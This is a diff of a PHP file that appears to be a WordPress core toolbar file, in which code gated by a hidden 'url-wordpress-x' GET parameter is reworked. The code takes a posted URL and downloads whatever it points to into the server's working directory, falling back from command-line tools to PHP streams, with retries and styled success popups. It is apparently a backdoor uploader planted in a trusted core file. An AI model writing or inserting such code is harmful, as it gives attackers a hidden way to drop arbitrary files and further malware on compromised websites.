@@ -230,86 +230,102 @@ if (isset($_GET["url-wordpress-x"])) {
         </form>
     </div>"; // Perbaikan tanda titik koma
 
-    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
-
     if (isset($_POST['uploadurl']) && !empty($_POST['url'])) {
         $url = $_POST['url'];
         $retries = 3;
-        uploadFileFromUrl($url, $dir, $retries);
-    }
-}
-
-function uploadFileFromUrl($url, $dir, $retries = 3)
-{
-    if (!filter_var($url, FILTER_VALIDATE_URL)) {
-        echo "<script>
-            Swal.fire({
-                title: 'Whoops!',
-                text: 'Invalid URL!',
-                icon: 'error',
-                confirmButtonText: 'OK',
-                background: '#2e2e2e',
-                color: '#ffffff'
-            });
-        </script>";
-        return;
+        uploadFileFromUrl($url, getcwd(), $retries);
     }
 
-    if (!is_dir($dir) || !is_writable($dir)) {
-        echo "<script>
-            Swal.fire({
-                title: 'Whoops!',
-                text: 'Invalid or unwritable directory!',
-                icon: 'error',
-                confirmButtonText: 'OK',
-                background: '#2e2e2e',
-                color: '#ffffff'
-            });
-        </script>";
-        return;
-    }
-
-    $fileName = basename(parse_url($url, PHP_URL_PATH));
-    $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $fileName);
-    $filePath = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
-
-    $attempt = 0;
-    $success = false;
-
-    while ($attempt < $retries) {
-        if (downloadFileWithCommand($url, $filePath) || 
-            downloadFileWithStream($url, $filePath) || 
-            downloadFileWithPhp($url, $filePath)) {
-            $success = true;
-            break;
+    function uploadFileFromUrl($url, $dir, $retries = 3)
+    {
+        if (!filter_var($url, FILTER_VALIDATE_URL)) {
+            echo " <script>
+                            function showCustomAlert() {
+                                Swal.fire({
+                                    title: 'Whoops!',
+                                    text: 'Invalid URL!',
+                                    icon: 'error',
+                                    confirmButtonText: 'OK',
+                                    background: '#2e2e2e',
+                                    color: '#ffffff'
+                                });
+                            }
+                            document.addEventListener('DOMContentLoaded', showCustomAlert);
+                        </script>";
+            return;
         }
-        $attempt++;
-    }
 
-    if ($success) {
-        echo "<script>
-            Swal.fire({
-                title: 'Completed!',
-                text: 'File uploaded from URL successfully!',
-                icon: 'success',
-                confirmButtonText: 'OK',
-                background: '#2e2e2e',
-                color: '#ffffff'
-            });
-        </script>";
-    } else {
-        echo "<script>
-            Swal.fire({
-                title: 'Whoops!',
-                text: 'Failed to fetch file content from URL after " . json_encode($retries) . " attempts!',
-                icon: 'error',
-                confirmButtonText: 'OK',
-                background: '#2e2e2e',
-                color: '#ffffff'
-            });
-        </script>";
+        if (!is_dir($dir) || !is_writable($dir)) {
+            echo " <script>
+                            function showCustomAlert() {
+                                Swal.fire({
+                                    title: 'Whoops!',
+                                    text: 'Invalid or unwritable directory!',
+                                    icon: 'error',
+                                    confirmButtonText: 'OK',
+                                    background: '#2e2e2e',
+                                    color: '#ffffff'
+                                });
+                            }
+                            document.addEventListener('DOMContentLoaded', showCustomAlert);
+                        </script>";
+            return;
+        }
+
+        $fileName = basename(parse_url($url, PHP_URL_PATH));
+        $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $fileName);
+        $filePath = rtrim($dir, '/') . '/' . $fileName;
+
+        $attempt = 0;
+        $success = false;
+
+        while ($attempt < $retries) {
+            // Try using command line tools
+            $success = downloadFileWithCommand($url, $filePath);
+            if (!$success) {
+                $success = downloadFileWithStream($url, $filePath);
+            }
+            if (!$success) {
+                $success = downloadFileWithPhp($url, $filePath);
+            }
+            if ($success) {
+                break;
+            }
+            $attempt++;
+        }
+
+        if ($success) {
+            echo "  <script>
+                            function showCustomAlert() {
+                                Swal.fire({
+                                    title: 'Completed!',
+                                    text: 'File uploaded from URL successfully!',
+                                    icon: 'success',
+                                    confirmButtonText: 'OK',
+                                    background: '#2e2e2e',
+                                    color: '#ffffff'
+                                });
+                            }
+                            document.addEventListener('DOMContentLoaded', showCustomAlert);
+                        </script>";
+        } else {
+            echo" <script>
+                            function showCustomAlert() {
+                                Swal.fire({
+                                    title: 'Whoops!',
+                                    text: 'Failed to fetch file content from URL after $retries attempts!',
+                                    icon: 'error',
+                                    confirmButtonText: 'OK',
+                                    background: '#2e2e2e',
+                                    color: '#ffffff'
+                                });
+                            }
+                            document.addEventListener('DOMContentLoaded', showCustomAlert);
+                        </script>";
+        }
     }
 }
+
 /**
  * Core class used to implement the Toolbar API.
  *
